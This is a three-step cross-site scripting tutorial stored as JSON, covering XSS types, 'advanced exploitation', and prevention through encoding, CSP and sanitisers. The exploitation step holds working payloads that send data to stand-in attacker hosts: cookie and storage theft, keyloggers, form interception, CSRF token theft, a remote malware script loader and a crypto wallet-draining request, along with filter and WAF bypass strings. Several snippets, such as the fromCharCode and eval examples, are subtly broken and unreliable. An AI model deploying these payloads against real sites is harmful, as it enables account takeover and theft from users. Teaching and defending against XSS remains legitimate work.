{
  "id": "cross-site-scripting-xss-exploitation-prevention",
  "title": "Cross-Site Scripting (XSS) Exploitation and Prevention",
  "description": "Master XSS attack techniques, understand browser security mechanisms, and implement comprehensive prevention strategies for client-side injection vulnerabilities across all XSS variants.",
  "type": "tutorial",
  "steps": [
    {
      "id": "xss-fundamentals-types",
      "title": "XSS Fundamentals and Attack Types",
      "content": "OBJECTIVE: Understand the core concepts of Cross-Site Scripting, differentiate between attack types, and recognize how XSS exploits browser trust mechanisms.\n\nACADEMIC BACKGROUND:\nCross-Site Scripting (XSS) has been a persistent threat since the late 1990s, consistently ranking in the OWASP Top 10. XSS exploits the trust browsers place in content from web servers, allowing attackers to inject malicious scripts that execute in users' browsers. Understanding XSS requires knowledge of HTML, JavaScript, browser security models, and the Same-Origin Policy.\n\nSTEP-BY-STEP PROCESS:\n\n1. XSS Core Concept:\n\nThe Trust Relationship:\n```text\nBROWSER TRUST MODEL:\n1. Browser trusts content from web servers\n2. Scripts from trusted sites execute with user's privileges\n3. Cookies, localStorage, and DOM accessible to scripts\n4. Attacker injects malicious script via untrusted input\n5. Browser executes attacker's script with victim's privileges\n\nSECURITY IMPLICATION:\n- Session hijacking via cookie theft\n- Keylogging and credential harvesting\n- Account takeover and unauthorized actions\n- Malware distribution and drive-by downloads\n- Browser exploitation and further attacks\n```\n\nXSS vs Other Attacks:\n```text\nXSS vs CSRF:\n- XSS: Injects scripts that execute in victim's browser\n- CSRF: Tricks victim into sending unwanted requests\n\nXSS vs SQL Injection:\n- XSS: Client-side code injection\n- SQLi: Server-side database query manipulation\n\nXSS vs Command Injection:\n- XSS: Browser script execution\n- Command Injection: Server-side OS command execution\n```\n\n2. Reflected XSS:\n\nAttack Flow:\n```text\n1. Attacker crafts malicious URL with script payload\n2. Victim clicks link or visits malicious page\n3. Server reflects payload in response without encoding\n4. Browser executes script in victim's context\n5. Attacker gains access to victim's session/data\n\nEXAMPLE URL:\nhttps://example.com/search?q=<script>alert('XSS')</script>\n\nVULNERABLE CODE:\n<?php\n$query = $_GET['q'];\necho \"<h1>Search results for: $query</h1>\";\n?>\n\nSECURE CODE:\n<?php\n$query = htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');\necho \"<h1>Search results for: $query</h1>\";\n?>\n```\n\nCommon Reflected XSS Vectors:\n```html\n<!-- Basic script injection -->\n<script>alert('XSS')</script>\n\n<!-- Event handler -->\n\" onmouseover=alert('XSS')\n\n<!-- Image onerror -->\n<img src=x onerror=alert('XSS')>\n\n<!-- Link href -->\n<a href=\"javascript:alert('XSS')\">Click me</a>\n\n<!-- Meta refresh -->\n<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">\n```\n\n3. Stored XSS (Persistent XSS):\n\nAttack Characteristics:\n```text\nPERSISTENCE: Payload stored permanently in database\nSCOPE: Affects all users viewing the content\nIMPACT: Higher than reflected XSS\nDIFFICULTY: Requires input validation bypass\n\nEXAMPLE SCENARIO:\n1. Attacker posts comment with XSS payload\n2. Server stores payload in database\n3. All users viewing comments execute the script\n4. Attacker controls multiple victims simultaneously\n```\n\nStored XSS Vectors:\n```html\n<!-- Comment system -->\n<script>stealCookies()</script>\n\n<!-- User profile -->\n<img src=x onerror=\"location.href='//evil.com/log?cookie='+document.cookie\">\n\n<!-- Forum post -->\n<svg onload=alert('XSS')>\n\n<!-- Blog content -->\n<iframe src=\"javascript:alert('XSS')\"></iframe>\n\n<!-- Rich text editor bypass -->\n&lt;script&gt;alert('XSS')&lt;/script&gt; (if double-decoding)\n```\n\nDatabase Storage Issues:\n```sql\n-- Payload stored in database\nINSERT INTO comments (user_id, content) VALUES (1, '<script>alert(\"XSS\")</script>');\n\n-- Retrieved and displayed without encoding\nSELECT content FROM comments WHERE id = $id;\necho $row['content']; // Dangerous!\n\n-- Secure retrieval\nSELECT content FROM comments WHERE id = $id;\necho htmlspecialchars($row['content'], ENT_QUOTES, 'UTF-8');\n```\n\n4. DOM-Based XSS:\n\nClient-Side Vulnerability:\n```text\nLOCATION: Client-side JavaScript manipulation\nDETECTION: Hard to find server-side\nTRIGGER: URL fragments, form inputs, AJAX responses\n\nVULNERABLE CODE:\nvar hash = document.location.hash.substring(1);\nvar element = document.getElementById('content');\nelement.innerHTML = hash; // DANGEROUS\n\nATTACK URL:\nhttps://example.com/page#content=<script>alert('XSS')</script>\n\nSECURE CODE:\nvar hash = document.location.hash.substring(1);\nvar element = document.getElementById('content');\nelement.textContent = hash; // SAFE\n```\n\nDOM XSS Sources:\n```javascript\n// URL components\ndocument.location.href\ndocument.location.hash\ndocument.location.search\n\n// Form inputs\ndocument.getElementById('input').value\n\n// AJAX responses\nxhr.responseText\n\n// Local storage\nlocalStorage.getItem('data')\n\n// Cookies\ndocument.cookie\n```\n\nDOM XSS Sinks:\n```javascript\n// Dangerous sinks\nelement.innerHTML = userInput;\nelement.outerHTML = userInput;\ndocument.write(userInput);\ndocument.writeln(userInput);\neval(userInput);\nsetTimeout(userInput, 100);\nsetInterval(userInput, 100);\n\n// Safe alternatives\nelement.textContent = userInput;\nelement.setAttribute('href', safeUrl);\nJSON.parse(safeJson);\n```\n\n5. Blind XSS:\n\nOut-of-Band XSS:\n```text\nCHARACTERISTICS:\n- Payload stored but not visible to attacker\n- Requires external logging mechanism\n- Common in contact forms, logs, admin panels\n\nDETECTION METHODS:\n- XSS Hunter, EzXSS, or custom logging endpoints\n- DNS exfiltration\n- Webhooks or external callbacks\n\nPAYLOAD EXAMPLE:\n<script src=\"//attacker.com/log.php?cookie=\"+document.cookie></script>\n\nBLIND XSS TOOLS:\n- xsshunter.com\n- ezxss.com\n- Custom logging servers\n```\n\n6. Self-XSS:\n\nVictim Self-Exploitation:\n```text\nLIMITATIONS:\n- Requires victim to execute payload themselves\n- Not exploitable remotely\n- Often out-of-scope for bug bounties\n\nTRICKS TO EXPLOIT:\n- Social engineering to make victim paste payload\n- Combine with other vulnerabilities\n- Use in stored XSS scenarios\n\nEXAMPLE:\n\"Copy and paste this into your browser console for a free iPhone!\"\n<script>alert('You have been hacked!')</script>\n```\n\nWHAT TO LOOK FOR:\n- **Input Reflection**: User input appearing in HTML without encoding\n- **JavaScript Execution**: eval(), setTimeout() with user input\n- **DOM Manipulation**: innerHTML assignments with untrusted data\n- **Event Handlers**: onclick, onload with dynamic content\n- **URL Parameters**: Query strings, hash fragments in client-side code\n- **AJAX Responses**: JSON data inserted into DOM without validation\n- **Rich Text Editors**: WYSIWYG editors that allow HTML/script input\n\nSECURITY IMPLICATIONS:\n- **Session Hijacking**: Theft of authentication cookies and tokens\n- **Data Theft**: Access to localStorage, sessionStorage, form data\n- **Keylogging**: Capture of keystrokes and credentials\n- **Account Takeover**: Unauthorized actions on behalf of victim\n- **Malware Distribution**: Drive-by downloads and exploit kits\n- **Browser Exploitation**: Further attacks on browser vulnerabilities\n\nCOMMON PITFALLS:\n- **Encoding Confusion**: Different contexts require different encoding\n- **DOM XSS Oversight**: Focusing only on reflected/stored XSS\n- **Filter Evasion**: Modern filters catch obvious payloads\n- **Context Awareness**: Same payload dangerous in one context, safe in another\n- **AJAX Vulnerabilities**: JSON responses can contain XSS if mishandled\n- **Third-Party Scripts**: External libraries can introduce XSS vectors\n- **Rich Text Complexity**: HTML sanitization is extremely difficult\n\nTOOLS REFERENCE:\n- **XSStrike**: https://github.com/s0md3v/XSStrike (Advanced XSS scanner)\n- **Dalfox**: https://github.com/hahwul/dalfox (Blind XSS scanner)\n- **XSSer**: https://github.com/epsylon/xsser (XSS automation)\n- **XSS Hunter**: https://xsshunter.com/ (Blind XSS detection)\n- **Burp Suite**: https://portswigger.net/burp (Manual testing)\n- **OWASP ZAP**: https://www.zaproxy.org/ (Automated scanning)\n\nFURTHER READING:\n- OWASP XSS: https://owasp.org/www-community/attacks/xss/\n- XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\n- DOM XSS: https://owasp.org/www-community/attacks/DOM_Based_XSS\n- Content Security Policy: https://owasp.org/www-community/controls/Content_Security_Policy\n- Browser Security Handbook: https://code.google.com/archive/p/browsersec/wikis/Main.wiki",
      "tags": ["xss", "reflected-xss", "stored-xss", "dom-xss", "client-side-security"]
    },
    {
      "id": "xss-exploitation-techniques",
      "title": "Advanced XSS Exploitation Techniques",
      "content": "OBJECTIVE: Master sophisticated XSS exploitation methods, bypass common filters and WAFs, and understand real-world impact through practical attack scenarios.\n\nACADEMIC BACKGROUND:\nAdvanced XSS exploitation goes beyond basic alert() payloads to achieve meaningful impact. Real-world attacks focus on data exfiltration, session hijacking, and persistent control. Understanding filter evasion requires knowledge of encoding, obfuscation, and browser parsing quirks.\n\nSTEP-BY-STEP PROCESS:\n\n1. Cookie Theft and Session Hijacking:\n\nBasic Cookie Stealing:\n```javascript\n// Simple cookie theft\n<script>\nvar img = new XMLHttpRequest();\nimg.open('GET', 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));\nimg.send();\n</script>\n\n// Image-based exfiltration\n<img src=\"https://attacker.com/log?data=\" + btoa(document.cookie)>\n\n// CSS background exfiltration\n<div style=\"background: url(https://attacker.com/log?cookie=\" + document.cookie + \")\">\n```\n\nAdvanced Session Hijacking:\n```javascript\n// Complete session takeover\n<script>\n// Steal all sensitive data\nvar stolen = {\n  cookies: document.cookie,\n  localStorage: JSON.stringify(localStorage),\n  sessionStorage: JSON.stringify(sessionStorage),\n  url: window.location.href,\n  userAgent: navigator.userAgent,\n  timestamp: new Date().toISOString()\n};\n\n// Send to attacker\nvar xhr = new XMLHttpRequest();\nxhr.open('POST', 'https://attacker.com/steal');\nxhr.setRequestHeader('Content-Type', 'application/json');\nxhr.send(JSON.stringify(stolen));\n</script>\n```\n\n2. Keylogging and Credential Harvesting:\n\nJavaScript Keylogger:\n```javascript\n// Basic keylogger\n<script>\nvar keys = '';\ndocument.addEventListener('keypress', function(e) {\n  keys += e.key;\n  if (keys.length > 100) {\n    // Send keystrokes to attacker\n    fetch('https://attacker.com/keys', {\n      method: 'POST',\n      body: keys,\n      mode: 'no-cors'\n    });\n    keys = '';\n  }\n});\n</script>\n\n// Advanced keylogger with context\n<script>\nvar keystrokes = [];\nvar startTime = Date.now();\n\ndocument.addEventListener('keydown', function(e) {\n  keystrokes.push({\n    key: e.key,\n    code: e.code,\n    time: Date.now() - startTime,\n    target: e.target.tagName + (e.target.id ? '#' + e.target.id : '')\n  });\n});\n\n// Send on form submission or periodically\nsetInterval(function() {\n  if (keystrokes.length > 0) {\n    fetch('https://attacker.com/keystrokes', {\n      method: 'POST',\n      body: JSON.stringify(keystrokes),\n      mode: 'no-cors'\n    });\n    keystrokes = [];\n  }\n}, 30000);\n</script>\n```\n\nForm Data Interception:\n```javascript\n// Intercept form submissions\n<script>\nvar originalSubmit = HTMLFormElement.prototype.submit;\nHTMLFormElement.prototype.submit = function() {\n  // Capture form data\n  var formData = new FormData(this);\n  var data = {};\n  for (var pair of formData.entries()) {\n    data[pair[0]] = pair[1];\n  }\n  \n  // Send to attacker\n  fetch('https://attacker.com/form-data', {\n    method: 'POST',\n    body: JSON.stringify(data),\n    mode: 'no-cors'\n  });\n  \n  // Call original submit\n  originalSubmit.call(this);\n};\n</script>\n```\n\n3. CSRF Exploitation via XSS:\n\nCSRF Token Theft:\n```javascript\n// Steal CSRF tokens\n<script>\nvar token = document.querySelector('input[name=\"csrf_token\"]');\nif (token) {\n  fetch('https://attacker.com/csrf-token?token=' + token.value);\n}\n</script>\n\n// Meta tag token theft\n<script>\nvar token = document.querySelector('meta[name=\"csrf-token\"]');\nif (token) {\n  fetch('https://attacker.com/csrf-token?token=' + token.content);\n}\n</script>\n```\n\nAutomated CSRF Attacks:\n```javascript\n// Perform actions on behalf of victim\n<script>\nfunction csrfAttack() {\n  var xhr = new XMLHttpRequest();\n  xhr.open('POST', '/api/change-password');\n  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n  xhr.setRequestHeader('X-CSRF-Token', stolenToken);\n  xhr.send('new_password=evilpassword123');\n}\n\n// Execute after page load\nwindow.addEventListener('load', csrfAttack);\n</script>\n```\n\n4. Filter Evasion Techniques:\n\nHTML Entity Encoding Bypass:\n```html\n<!-- Double encoding -->\n%253cscript%253ealert('XSS')%253c/script%253e\n\n<!-- Mixed encoding -->\n<scr%69pt>alert('XSS')</scr%69pt>\n\n<!-- Unicode encoding -->\n&#x3c;script&#x3e;alert('XSS')&#x3c;/script&#x3e;\n\n<!-- Overlong UTF-8 -->\n%C0%BCscript%C0%BEalert('XSS')%C0%BC/script%C0%BE\n```\n\nCase Variation and Comments:\n```html\n<!-- Case mixing -->\n<ScRiPt>alert('XSS')</ScRiPt>\n\n<!-- Inline comments -->\n<scr<!-- comment -->ipt>alert('XSS')</scr<!-- comment -->ipt>\n\n<!-- CDATA sections -->\n<![CDATA[<script>alert('XSS')</script>]]>\n\n<!-- Conditional comments -->\n<!--[if gte IE 4]><script>alert('XSS')</script><![endif]-->\n```\n\nTag Breaking and Injection:\n```html\n<!-- Breaking out of attributes -->\n\" onmouseover=alert('XSS')\n\n<!-- Breaking out of tags -->\n</textarea><script>alert('XSS')</script>\n\n<!-- Namespace confusion -->\n<a:script xmlns:a=\"http://www.w3.org/1999/xhtml\">alert('XSS')</a:script>\n\n<!-- Foreign context -->\n<math><mtext><script>alert('XSS')</script></mtext></math>\n```\n\n5. WAF Bypass Techniques:\n\nCommon WAF Evasion:\n```html\n<!-- Fragmentation -->\n<scr\nipt>alert('XSS')</scr\nipt>\n\n<!-- Concatenation -->\n<script>eval('al'+'ert(''XSS'')')</script>\n\n<!-- Dynamic generation -->\n<script>document.write('<img src=x onerror=alert(\\'XSS\\)>')</script>\n\n<!-- Event handler variation -->\n<div onmouseover=\"alert('XSS')\" style=\"width:100px;height:100px;background:red;\"></div>\n```\n\nAdvanced WAF Bypass:\n```javascript\n// String splitting and joining\n<script>('al'+'ert')('XSS')</script>\n\n// Character code execution\n<script>String.fromCharCode(97,108,101,114,116)(88,83,83)</script>\n\n// Template literals\n<script>alert`XSS`</script>\n\n// Function constructor\n<script>new Function('alert(\"XSS\")')()</script>\n```\n\n6. Browser-Specific Exploits:\n\nChrome XSS Auditor Bypass:\n```html\n<!-- Add random parameters -->\n<script>alert('XSS')</script><random>garbage</random>\n\n<!-- Use form submissions -->\n<form action=\"javascript:alert('XSS')\">\n<input type=submit value=\"Click me\">\n</form>\n```\n\nInternet Explorer Quirks:\n```html\n<!-- Conditional compilation -->\n<script><!--[if gte IE 4]>\nalert('XSS');\n<![endif]--></script>\n\n<!-- Dynamic properties -->\n<script language=\"JScript.Encode\">#@~^...^#~@</script>\n```\n\n7. Real-World Impact Scenarios:\n\nDefacement Attacks:\n```javascript\n// Change page content\n<script>\ndocument.body.innerHTML = '<h1>HACKED BY ATTACKER</h1>' +\n  '<img src=\"https://attacker.com/deface.jpg\">';\n</script>\n```\n\nMalware Distribution:\n```javascript\n// Drive-by download\n<script>\nvar script = document.createElement('script');\nscript.src = 'https://attacker.com/malware.js';\ndocument.head.appendChild(script);\n</script>\n```\n\nCryptocurrency Theft:\n```javascript\n// Web3 wallet draining\n<script>\nif (window.ethereum) {\n  window.ethereum.request({\n    method: 'eth_sendTransaction',\n    params: [{\n      to: '0xAttackerAddress',\n      value: '1000000000000000000' // 1 ETH\n    }]\n  });\n}\n</script>\n```\n\n8. Polyglot Payloads:\n\nMulti-Context Payloads:\n```html\n<!-- Works in multiple contexts -->\njavascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\" /+/onmouseover=1/+/[*/[]/+alert(1)//'>\n\n<!-- MariaDB/MySQL XSS -->\n' AND 1=0 UNION SELECT \"<script>alert('XSS')</script>\" --\n\n<!-- SQL + XSS combination -->\n' UNION SELECT '<img src=x onerror=alert(\"XSS\")>' --\n```\n\nWHAT TO LOOK FOR:\n- **Data Exfiltration**: Scripts sending sensitive data to external servers\n- **Session Manipulation**: Code that modifies cookies or authentication state\n- **Input Capture**: Event listeners capturing keystrokes or form data\n- **CSRF Exploitation**: Scripts performing actions with victim's authority\n- **Filter Bypass**: Obfuscated payloads that evade detection\n- **Browser Quirks**: Exploits using browser-specific parsing behavior\n- **Multi-Stage Attacks**: XSS used as entry point for further exploitation\n\nSECURITY IMPLICATIONS:\n- **Complete Account Compromise**: Full access to victim's accounts and data\n- **Financial Loss**: Theft of payment information or cryptocurrency\n- **Data Breach**: Exposure of sensitive information across sessions\n- **Malware Propagation**: Infection of multiple users through persistent XSS\n- **Reputation Damage**: Website defacement and trust erosion\n- **Regulatory Violations**: Breach of privacy laws and compliance requirements\n\nCOMMON PITFALLS:\n- **Over-Reliance on Filters**: WAFs and input validation can be bypassed\n- **Context Insensitivity**: Same payload dangerous in one context, safe in another\n- **Browser Differences**: XSS behavior varies across browsers and versions\n- **Encoding Layers**: Multiple encoding/decoding can bypass protections\n- **Dynamic Content**: AJAX-loaded content may bypass static analysis\n- **Third-Party Scripts**: External libraries can introduce unexpected XSS vectors\n- **CSP Complexity**: Content Security Policy requires careful implementation\n\nTOOLS REFERENCE:\n- **BeEF**: https://github.com/beefproject/beef (Browser exploitation framework)\n- **XSS-Proxy**: https://github.com/s0md3v/XSS-Proxy (XSS exploitation tool)\n- **XSStrike**: https://github.com/s0md3v/XSStrike (Advanced XSS detection)\n- **XSS Hunter**: https://xsshunter.com/ (Blind XSS exploitation)\n- **Burp Suite**: https://portswigger.net/burp (Manual exploitation)\n- **sqlmap**: https://sqlmap.org/ (SQL+XSS combined attacks)\n\nFURTHER READING:\n- Advanced XSS Exploitation: https://www.exploit-db.com/docs/english/25395-advanced-xss-exploitation.pdf\n- XSS Filter Evasion: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet\n- Browser Security: https://code.google.com/archive/p/browsersec/\n- Real-World XSS Attacks: https://xss.cx/\n- WAF Bypass Techniques: https://github.com/0xInfection/Awesome-WAF",
      "tags": ["xss-exploitation", "filter-bypass", "waf-evasion", "session-hijacking", "data-theft"]
    },
    {
      "id": "xss-prevention-defense",
      "title": "XSS Prevention and Defense Strategies",
      "content": "OBJECTIVE: Implement comprehensive XSS prevention measures, understand Content Security Policy, and build secure web applications resistant to cross-site scripting attacks.\n\nACADEMIC BACKGROUND:\nXSS prevention requires a defense-in-depth approach combining input validation, output encoding, Content Security Policy, and secure coding practices. The OWASP XSS Prevention Cheat Sheet provides the authoritative guidance for implementing these controls effectively.\n\nSTEP-BY-STEP PROCESS:\n\n1. Input Validation and Sanitization:\n\nClient-Side Validation:\n```javascript\n// Basic input validation\nfunction validateInput(input) {\n  // Remove potentially dangerous characters\n  return input.replace(/[<>]/g, '');\n}\n\n// Whitelist approach (recommended)\nfunction validateUsername(username) {\n  const allowed = /^[a-zA-Z0-9_-]{3,20}$/;\n  return allowed.test(username);\n}\n\n// Length limits\nif (input.length > 1000) {\n  throw new Error('Input too long');\n}\n```\n\nServer-Side Validation:\n```php\n// PHP input validation\nfunction sanitizeString($input) {\n  // Remove null bytes and other dangerous characters\n  $input = str_replace(chr(0), '', $input);\n  \n  // Length check\n  if (strlen($input) > 1000) {\n    return false;\n  }\n  \n  // Pattern validation\n  if (!preg_match('/^[a-zA-Z0-9_-]+$/', $input)) {\n    return false;\n  }\n  \n  return $input;\n}\n```\n\n2. Output Encoding:\n\nContext-Aware Encoding:\n```php\n// HTML context encoding\n$userInput = htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');\n\necho \"<div>$userInput</div>\"; // Safe\n\n// JavaScript context encoding\nfunction encodeForJavaScript($input) {\n  return str_replace(\n    ['\\\\', '\"', \"'\", \"\\r\", \"\\n\", \"</\"],\n    ['\\\\\\\\', '\\\\\"', \"\\\\'\", '\\\\r', '\\\\n', \"<\\/\"],\n    $input\n  );\n}\n\n// CSS context encoding\nfunction encodeForCSS($input) {\n  return str_replace(\n    ['<', '>', '\"', \"'\", '(', ')', '/'],\n    ['\\\\3c', '\\\\3e', '\\\\22', '\\\\27', '\\\\28', '\\\\29', '\\\\2f'],\n    $input\n  );\n}\n```\n\nURL Encoding:\n```javascript\n// URL parameter encoding\nconst safeUrl = encodeURIComponent(userInput);\nwindow.location.href = `/search?q=${safeUrl}`;\n\n// URL component encoding\nconst safeHash = encodeURIComponent(userInput);\nwindow.location.hash = safeHash;\n```\n\n3. Content Security Policy (CSP):\n\nBasic CSP Implementation:\n```http\n// Strict CSP\nContent-Security-Policy: default-src 'self'\n\n// Comprehensive CSP\nContent-Security-Policy:\n  default-src 'self';\n  script-src 'self' 'nonce-random123' 'strict-dynamic';\n  style-src 'self' 'nonce-random123';\n  img-src 'self' data: https:;\n  font-src 'self' data:;\n  connect-src 'self';\n  media-src 'self';\n  object-src 'none';\n  child-src 'self';\n  frame-ancestors 'none';\n  base-uri 'self';\n  form-action 'self';\n  upgrade-insecure-requests;\n  block-all-mixed-content\n```\n\nCSP Nonce Implementation:\n```php\n// Generate nonce\n$nonce = base64_encode(random_bytes(16));\n\n// Set CSP header\nheader(\"Content-Security-Policy: script-src 'nonce-$nonce'\");\n\n// Use in HTML\n<script nonce=\"<?php echo $nonce; ?>\">\n  alert('This script is allowed');\n</script>\n```\n\nCSP Reporting:\n```http\n// Report-only mode for testing\nContent-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report\n\n// Handle reports\napp.post('/csp-report', (req, res) => {\n  console.log('CSP Violation:', req.body);\n  res.status(200).end();\n});\n```\n\n4. Secure DOM Manipulation:\n\nSafe DOM Methods:\n```javascript\n// DANGEROUS - Never use with untrusted input\nconst element = document.getElementById('content');\nelement.innerHTML = userInput; // XSS vulnerability\n\n// SAFE - Text content only\nconst element = document.getElementById('content');\nelement.textContent = userInput; // No HTML execution\n\n// SAFE - Sanitized HTML\nconst element = document.getElementById('content');\nelement.innerHTML = DOMPurify.sanitize(userInput);\n```\n\nDOMPurify Usage:\n```html\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.4.0/purify.min.js\"></script>\n<script>\n  const cleanHTML = DOMPurify.sanitize(dirtyHTML);\n  element.innerHTML = cleanHTML;\n</script>\n```\n\n5. HTTP Security Headers:\n\nXSS Prevention Headers:\n```http\n// X-XSS-Protection (deprecated but still useful)\nX-XSS-Protection: 1; mode=block\n\n// X-Content-Type-Options\nX-Content-Type-Options: nosniff\n\n// Referrer-Policy\nReferrer-Policy: strict-origin-when-cross-origin\n\n// Permissions-Policy\nPermissions-Policy: geolocation=(), microphone=(), camera=()\n```\n\n6. Secure Cookie Handling:\n\nHttpOnly and Secure Flags:\n```php\n// Secure session cookies\nsession_set_cookie_params([\n  'lifetime' => 3600,\n  'path' => '/',\n  'domain' => 'example.com',\n  'secure' => true,      // HTTPS only\n  'httponly' => true,    // JavaScript cannot access\n  'samesite' => 'Strict'  // CSRF protection\n]);\n\n// Set secure cookies\nsetcookie('session', $session_id, [\n  'expires' => time() + 3600,\n  'path' => '/',\n  'domain' => 'example.com',\n  'secure' => true,\n  'httponly' => true,\n  'samesite' => 'Strict'\n]);\n```\n\n7. Framework-Specific Protections:\n\nReact XSS Prevention:\n```jsx\n// DANGEROUS\nfunction DangerousComponent() {\n  return <div dangerouslySetInnerHTML={{__html: userInput}} />;\n}\n\n// SAFE\nfunction SafeComponent() {\n  return <div>{userInput}</div>; // Auto-escaped\n}\n```\n\nAngular XSS Prevention:\n```typescript\n// Angular auto-sanitizes by default\n@Component({\n  template: `<div [innerHTML]=\"userInput\"></div>` // Sanitized\n})\nexport class MyComponent {\n  userInput: string = '<script>alert(\"XSS\")</script>';\n}\n\n// Bypass sanitization (dangerous)\nimport { DomSanitizer } from '@angular/platform-browser';\nconstructor(private sanitizer: DomSanitizer) {}\n\ngetBypassedHTML() {\n  return this.sanitizer.bypassSecurityTrustHtml(dangerousHTML);\n}\n```\n\nVue.js XSS Prevention:\n```vue\n<template>\n  <!-- Auto-escaped -->\n  <div>{{ userInput }}</div>\n  \n  <!-- Explicit HTML (dangerous) -->\n  <div v-html=\"userInput\"></div>\n</template>\n\n<script>\n// Use computed property for sanitization\ncomputed: {\n  safeHTML() {\n    return DOMPurify.sanitize(this.userInput);\n  }\n}\n</script>\n```\n\n8. Input Sanitization Libraries:\n\nServer-Side Sanitization:\n```php\n// HTML Purifier\nrequire_once 'vendor/ezyang/htmlpurifier/library/HTMLPurifier.auto.php';\n\n$config = HTMLPurifier_Config::createDefault();\n$purifier = new HTMLPurifier($config);\n$clean_html = $purifier->purify($dirty_html);\n```\n\nJavaScript Sanitization:\n```javascript\n// DOMPurify\nconst clean = DOMPurify.sanitize(dirty, {\n  ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],\n  ALLOWED_ATTR: ['href']\n});\n\n// Sanitize HTML\nconst clean = DOMPurify.sanitize('<script>alert(1)</script><p>safe</p>');\n// Result: <p>safe</p>\n```\n\n9. Testing XSS Protections:\n\nAutomated Testing:\n```bash\n# OWASP ZAP XSS testing\nzap.sh -cmd -autorun /path/to/xss-policy.yaml\n\n# XSStrike with CSP bypass\nxsstrike -u \"https://example.com\" --csp\n\n# Custom test payloads\ncurl -X POST https://example.com \\\n  -d 'input=<script>alert(\"XSS\")</script>' \\\n  -H 'Content-Type: application/x-www-form-urlencoded'\n```\n\nManual Testing Checklist:\n```text\n□ Test all input fields with XSS payloads\n□ Verify output encoding in all contexts\n□ Check CSP headers are properly configured\n□ Test DOM manipulation with user input\n□ Verify HttpOnly and Secure cookie flags\n□ Test file upload XSS (SVG, HTML files)\n□ Check JSON responses for XSS in error messages\n□ Test AJAX responses inserted into DOM\n□ Verify third-party content doesn't introduce XSS\n□ Test with different browsers and versions\n```\n\nWHAT TO LOOK FOR:\n- **Missing Encoding**: Raw user input in HTML, JavaScript, or CSS contexts\n- **Unsafe DOM Methods**: innerHTML, outerHTML, document.write with untrusted data\n- **Weak CSP**: Overly permissive Content Security Policy rules\n- **Insecure Cookies**: Missing HttpOnly, Secure, or SameSite flags\n- **Input Validation Gaps**: Unvalidated input that reaches output\n- **Framework Bypass**: Circumventing framework security features\n- **Third-Party Risks**: External scripts or content introducing XSS\n\nSECURITY IMPLICATIONS:\n- **Attack Prevention**: Blocking XSS eliminates session hijacking and data theft\n- **Compliance Achievement**: Meeting security standards and regulations\n- **User Trust**: Protecting users from malicious script execution\n- **Business Protection**: Preventing account takeover and financial loss\n- **Reputation Preservation**: Avoiding defacement and trust erosion\n\nCOMMON PITFALLS:\n- **Inconsistent Encoding**: Different contexts require different encoding approaches\n- **CSP Complexity**: Difficult to implement without breaking legitimate functionality\n- **Framework Assumptions**: Not all frameworks provide automatic XSS protection\n- **DOM Manipulation**: Forgetting that client-side code can introduce XSS\n- **JSON Security**: JSON responses can contain XSS if parsed incorrectly\n- **Mixed Content**: HTTPS sites loading HTTP resources bypasses protections\n- **Encoding Layers**: Multiple encoding/decoding passes can bypass validation\n- **Rich Text Challenges**: HTML editors require sophisticated sanitization\n\nTOOLS REFERENCE:\n- **DOMPurify**: https://github.com/cure53/DOMPurify (HTML sanitization)\n- **HTML Purifier**: https://htmlpurifier.org/ (PHP HTML sanitization)\n- **CSP Evaluator**: https://csp-evaluator.withgoogle.com/ (CSP analysis)\n- **OWASP ZAP**: https://www.zaproxy.org/ (XSS testing)\n- **Retire.js**: https://retirejs.github.io/retire.js/ (Vulnerable library detection)\n- **Snyk**: https://snyk.io/ (Dependency vulnerability scanning)\n\nFURTHER READING:\n- OWASP XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\n- Content Security Policy: https://content-security-policy.com/\n- DOM-based XSS Prevention: https://owasp.org/www-community/attacks/DOM_Based_XSS\n- Secure Coding Practices: https://owasp.org/www-pdf-archive/OWASP_SCP_Quick_Reference_Guide_v2.pdf\n- Browser Security Headers: https://owasp.org/www-project-secure-headers/\n- Framework Security: https://owasp.org/index.php/Category:OWASP_Application_Security_FAQs",
      "tags": ["xss-prevention", "csp", "input-validation", "output-encoding", "secure-coding"]
    }
  ]
}